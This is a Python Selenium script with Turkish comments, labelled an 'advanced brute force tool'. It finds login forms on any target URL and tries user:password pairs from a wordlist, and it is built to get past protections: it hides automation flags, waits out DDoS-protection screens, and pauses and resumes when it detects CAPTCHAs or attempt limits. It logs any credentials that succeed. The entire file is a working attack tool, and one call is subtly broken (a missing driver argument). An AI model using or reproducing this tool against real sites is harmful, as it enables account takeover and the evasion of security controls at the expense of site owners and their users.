# --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT ---
import argparse
import sys
import time
from tqdm import tqdm
from colorama import Fore, Style, init
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
import logging
import os
import re

# --- Renkler ---
RESET = "\033[0m"
KIRMIZI = "\033[31m"
YESIL = "\033[32m"
SARI = "\033[33m"
MAVI = "\033[34m"

# --- Logger Kurulumu ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def get_driver(browser_name, driver_path=None):
    """Belirtilen tarayıcı için WebDriver'ı başlatır."""
    try:
        if browser_name.lower() == 'firefox':
            options = webdriver.FirefoxOptions()
            # options.add_argument("--headless") # Headless mod şu an için önerilmiyor.
            logger.info("Firefox WebDriver başlatılıyor...")
            return webdriver.Firefox(options=options)
        elif browser_name.lower() == 'chrome':
            options = webdriver.ChromeOptions()
            # options.add_argument("--headless") # Headless mod şu an için önerilmiyor.
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            logger.info("Chrome WebDriver başlatılıyor...")
            if driver_path:
                return webdriver.Chrome(executable_path=driver_path, options=options)
            else:
                return webdriver.Chrome(options=options)
        else:
            logger.error(f"Desteklenmeyen tarayıcı: {browser_name}")
            return None
    except WebDriverException as e:
        logger.error(f"{KIRMIZI}WebDriver başlatılırken hata oluştu: {e}{RESET}")
        if "session not created" in str(e) or "This version of ChromeDriver" in str(e):
             logger.error(f"{SARI}Tarayıcı sürümünüz (Chrome/Firefox) ile WebDriver sürümü uyumsuz olabilir.{RESET}")
             logger.error(f"{SARI}Lütfen tarayıcınızı güncelleyin veya doğru WebDriver'ı indirin.{RESET}")
        elif "net::ERR_NAME_NOT_RESOLVED" in str(e):
            logger.error(f"{KIRMIZI}Adres çözümlenemedi. URL'yi kontrol edin veya internet bağlantınızı doğrulayın.{RESET}")
        return None

def find_element_intelligently(driver, strategy, value, timeout=10):
    """Öğeyi bulmak için bekler."""
    try:
        return WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((strategy, value))
        )
    except TimeoutException:
        return None

def find_login_elements(driver):
    """Giriş formundaki kullanıcı adı, şifre ve gönderim butonu öğelerini akıllıca bulur."""
    username_field = None
    password_field = None
    submit_button = None

    # Olası iframe'leri kontrol et
    iframes = driver.find_elements(By.TAG_NAME, 'iframe')
    for iframe in iframes:
        try:
            logger.info(f"{SARI}Iframe'e geçiliyor...{RESET}")
            driver.switch_to.frame(iframe)
            username_field, password_field, submit_button = find_elements_in_current_frame(driver)
            if username_field and password_field:
                return username_field, password_field, submit_button, True # Iframe'de bulundu
            driver.switch_to.default_content() # Ana sayfaya geri dön
        except Exception as e:
            logger.warning(f"Iframe'e geçilirken hata: {e}")
            driver.switch_to.default_content()

    # Iframe'de bulunamazsa ana sayfada ara
    username_field, password_field, submit_button = find_elements_in_current_frame(driver)
    return username_field, password_field, submit_button, False

def find_elements_in_current_frame(driver):
    """Mevcut çerçevedeki giriş öğelerini bulur."""
    # Olası kullanıcı adı tanımlayıcıları
    username_locators = [
        (By.ID, 'username'), (By.ID, 'user'), (By.ID, 'login'), (By.ID, 'email'),
        (By.NAME, 'username'), (By.NAME, 'user'), (By.NAME, 'login'), (By.NAME, 'email'), (By.NAME, 'session[username_or_email]'),
        (By.CSS_SELECTOR, "[placeholder*='sername']"), (By.CSS_SELECTOR, "[placeholder*='mail']"),
        (By.XPATH, "//*[@type='email']"), (By.XPATH, "//*[@type='text' and (contains(@name, 'user') or contains(@name, 'login'))]")
    ]
    # Olası şifre tanımlayıcıları
    password_locators = [
        (By.ID, 'password'), (By.ID, 'pass'),
        (By.NAME, 'password'), (By.NAME, 'pass'), (By.NAME, 'session[password]'),
        (By.CSS_SELECTOR, "[placeholder*='assword']"),
        (By.XPATH, "//*[@type='password']")
    ]
    # Olası gönderim butonu tanımlayıcıları
    submit_locators = [
        (By.TAG_NAME, 'button'),
        (By.XPATH, "//*[@type='submit']"),
        (By.CSS_SELECTOR, "button[type='submit']"),
        (By.ID, 'login-button'),(By.ID, 'login_button'), (By.ID, 'submit-button')
    ]

    username_field, password_field, submit_button = None, None, None

    logger.info("Kullanıcı adı alanı aranıyor...")
    for by, value in username_locators:
        try:
            username_field = find_element_intelligently(driver, by, value, 2)
            if username_field:
                logger.info(f"{YESIL}Kullanıcı adı alanı bulundu: {by}={value}{RESET}")
                break
        except:
            continue

    logger.info("Şifre alanı aranıyor...")
    for by, value in password_locators:
        try:
            password_field = find_element_intelligently(driver, by, value, 2)
            if password_field:
                logger.info(f"{YESIL}Şifre alanı bulundu: {by}={value}{RESET}")
                break
        except:
            continue

    logger.info("Giriş butonu aranıyor...")
    for by, value in submit_locators:
        try:
            # Sadece görünür ve tıklanabilir butonları seç
            element = find_element_intelligently(driver, by, value, 2)
            if element and element.is_displayed() and element.is_enabled():
                 # "Sign up" veya "Kaydol" gibi kelimeleri içeren butonları ele
                if any(keyword in element.text.lower() for keyword in ['kaydol', 'sign up', 'register']):
                    continue
                submit_button = element
                logger.info(f"{YESIL}Giriş butonu bulundu: {by}={value}{RESET} (Metin: '{element.text}')")
                break
        except:
            continue

    return username_field, password_field, submit_button

def get_field_length_limits(field):
    """Bir giriş alanının minlength ve maxlength özniteliklerini alır."""
    min_len = field.get_attribute("minlength")
    max_len = field.get_attribute("maxlength")
    return int(min_len) if min_len and min_len.isdigit() else 0, int(max_len) if max_len and max_len.isdigit() else 1000

def filter_wordlist(wordlist_path, min_user_len, max_user_len, min_pass_len, max_pass_len):
    """Kelime listesini alan uzunluklarına göre filtreler."""
    filtered_list = []
    logger.info("Kelime listesi filtreleniyor...")
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' not in line:
                continue
            user, pwd = line.split(':', 1)
            if (min_user_len <= len(user) <= max_user_len) and \
               (min_pass_len <= len(pwd) <= max_pass_len):
                filtered_list.append((user, pwd))
    logger.info(f"{YESIL}{len(filtered_list)} geçerli kombinasyon bulundu.{RESET}")
    return filtered_list

def fix_url(url):
    """Yaygın URL yazım hatalarını düzeltir."""
    if not re.match(r'^(http|https)://', url):
        logger.warning(f"URL formatı geçersiz görünüyor: '{url}'. 'https://' ekleniyor.")
        return 'https://' + url.lstrip('htps:/')
    return url

def main(url, wordlist, browser, driver_path, cooldown, rate_limit):
    driver = get_driver(browser, driver_path)
    if not driver:
        return

    original_url = fix_url(url)
    driver.get(original_url)

    try:
        # --- YÜKLEME EKRANI BEKLEME ---
        # Sayfanın tam olarak yüklenmesini ve potansiyel bir DDoS koruma ekranının
        # geçmesini beklemek için kullanıcı adı alanının görünür olmasını bekliyoruz.
        logger.info(f"{SARI}Sayfanın ve olası DDOS korumasının yüklenmesi bekleniyor... (Max 30 saniye){RESET}")
        WebDriverWait(driver, 30).until(
            EC.visibility_of_element_located((By.XPATH, "//*[(@type='email' or @type='text' or @type='password' or @type='submit') and not(contains(@style,'display:none') or contains(@style,'visibility:hidden'))] | //button"))
        )
        logger.info(f"{YESIL}Sayfa yüklendi, giriş formu elemanları aranıyor...{RESET}")
        
        username_field, password_field, submit_button, in_iframe = find_login_elements(driver)

        if not username_field or not password_field:
            logger.error(f"{KIRMIZI}Giriş alanları otomatik olarak bulunamadı.{RESET}")
            logger.error(f"{SARI}Lütfen sayfa kaynağını kontrol edin veya manuel olarak tanımlayın.{RESET}")
            driver.quit()
            return

        min_user_len, max_user_len = get_field_length_limits(username_field)
        min_pass_len, max_pass_len = get_field_length_limits(password_field)

        logger.info(f"Kullanıcı adı uzunluk limiti: min={min_user_len}, max={max_user_len}")
        logger.info(f"Şifre uzunluk limiti: min={min_pass_len}, max={max_pass_len}")

        if not os.path.exists(wordlist):
            logger.error(f"{KIRMIZI}Kelime listesi bulunamadı: {wordlist}{RESET}")
            driver.quit()
            return
            
        combos = filter_wordlist(wordlist, min_user_len, max_user_len, min_pass_len, max_pass_len)
        
        if not combos:
            logger.warning(f"{SARI}Filtreleme sonrası denenecek kombinasyon kalmadı.{RESET}")
            driver.quit()
            return

        total_combos = len(combos)
        logger.info(f"Brute force denemeleri başlıyor: {total_combos} kombinasyon denenecek.")
        
        attempts = 0
        for i, (username, password) in enumerate(combos):
            try:
                # Her denemeden önce iframe'e tekrar geçiş yap (eğer gerekiyorsa)
                if in_iframe:
                    driver.switch_to.default_content()
                    iframe = driver.find_elements(By.TAG_NAME, 'iframe')[0] # Varsayım: ilk iframe
                    driver.switch_to.frame(iframe)
                
                # Elementlerin taze referanslarını al
                current_username_field = find_element_intelligently(driver, By.ID, username_field.get_attribute('id')) or username_field
                current_password_field = find_element_intelligently(driver, By.ID, password_field.get_attribute('id')) or password_field
                
                # --- Gelişmiş Giriş Simülasyonu ---
                # "Please fill out this field" hatasını önlemek için JS kullanılıyor.
                driver.execute_script("arguments[0].value = arguments[1];", current_username_field, username)
                driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", current_username_field)
                driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", current_username_field)
                
                driver.execute_script("arguments[0].value = arguments[1];", current_password_field, password)
                driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", current_password_field)
                driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", current_password_field)

                time.sleep(0.5) # Girişlerin işlenmesi için kısa bir bekleme

                if submit_button:
                    current_submit_button = find_element_intelligently(By.ID, submit_button.get_attribute('id')) or submit_button
                    current_submit_button.click()
                else: # Buton bulunamazsa Enter tuşuna basmayı dene
                    current_password_field.send_keys(selenium.webdriver.common.keys.Keys.ENTER)

                logger.info(f"[{i+1}/{total_combos}] Deneniyor -> Kullanıcı: {username} | Şifre: {password}")
                
                # URL değişti mi diye kontrol et (başarılı giriş göstergesi)
                time.sleep(2) # Sayfanın yönlenmesi için bekle
                if driver.current_url != original_url and "login" not in driver.current_url.lower():
                    logger.info(f"{YESIL}Giriş Başarılı!{RESET}")
                    logger.info(f"{YESIL}Kullanıcı Adı: {username}{RESET}")
                    logger.info(f"{YESIL}Şifre: {password}{RESET}")
                    break
                
                attempts += 1
                if attempts >= rate_limit:
                    logger.warning(f"{SARI}Oran limiti ({rate_limit} deneme) doldu. Beklemeye alınıyor...{RESET}")
                    page_source = driver.page_source.lower()
                    if "captcha" in page_source or "too many attempts" in page_source or "çok fazla deneme" in page_source:
                        logger.warning(f"{KIRMIZI}CAPTCHA veya deneme limiti tespit edildi! {cooldown} saniye bekleniyor...{RESET}")
                        time.sleep(cooldown)
                        logger.info("Denemelere devam ediliyor...")
                        attempts = 0 # Sayacı sıfırla
                        driver.get(original_url) # Sayfayı yenile
                        # Sayfa yenilendiği için elemanları tekrar bulmak gerekebilir
                        WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, "//*[(@type='email' or @type='text' or @type='password')]")))
                        username_field, password_field, submit_button, in_iframe = find_login_elements(driver)


            except (NoSuchElementException, TimeoutException) as e:
                logger.error(f"{KIRMIZI}Sayfa elemanları bulunamadı veya zaman aşımına uğradı. Sayfa yapısı değişmiş olabilir.{RESET}")
                logger.error(f"Hata: {e}")
                logger.info("Sayfa yenileniyor ve devam ediliyor...")
                driver.get(original_url)
                # Bekleme ve elemanları tekrar bulma
                WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, "//*[(@type='email' or @type='text' or @type='password')]")))
                username_field, password_field, submit_button, in_iframe = find_login_elements(driver)
                continue
            except Exception as e:
                logger.error(f"{KIRMIZI}Beklenmedik bir hata oluştu: {e}{RESET}")
                time.sleep(2)
    
    except (TimeoutException, WebDriverException) as e:
         if "net::ERR_NAME_NOT_RESOLVED" in str(e) or "dnsNotFound" in str(e).lower():
            logger.error(f"{KIRMIZI}DNS çözümleme hatası: URL'ye ulaşılamıyor -> {original_url}{RESET}")
            logger.error(f"{KIRMIZI}Lütfen URL'yi ve internet bağlantınızı kontrol edin.{RESET}")
         else:
            logger.error(f"{KIRMIZI}Sayfa yüklenirken bir hata oluştu veya zaman aşımına uğradı.{RESET}")
            logger.error(f"{KIRMIZI}Olası Nedenler: İnternet bağlantısı sorunları, sitenin yavaş olması veya DDOS koruması.{RESET}")
            logger.error(f"Hata Detayı: {e}")

    finally:
        logger.info("Tarayıcı kapatılıyor.")
        driver.quit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Gelişmiş Brute Force Aracı")
    parser.add_argument("url", help="Hedef URL (örn: https://site.com/login)")
    parser.add_argument("-w", "--wordlist", required=True, help="Kullanıcı:Şifre formatında kelime listesi dosyası.")
    parser.add_argument("-b", "--browser", default="firefox", choices=['chrome', 'firefox'], help="Kullanılacak tarayıcı (chrome/firefox). Varsayılan: firefox")
    parser.add_argument("-d", "--driver-path", default=None, help="Chrome için spesifik bir chromedriver yolu.")
    parser.add_argument("-cd", "--cooldown", type=int, default=60, help="CAPTCHA tespit edildiğinde bekleme süresi (saniye). Varsayılan: 60")
    parser.add_argument("-rl", "--rate-limit", type=int, default=15, help="Kaç denemede bir CAPTCHA kontrolü yapılacağı. Varsayılan: 15")
    
    args = parser.parse_args()

    main(args.url, args.wordlist, args.browser, args.driver_path, args.cooldown, args.rate_limit)

# --- AI SIGNATURE: ROBUST-ELEMENT-FINDER-SCRIPT-BITIS --- 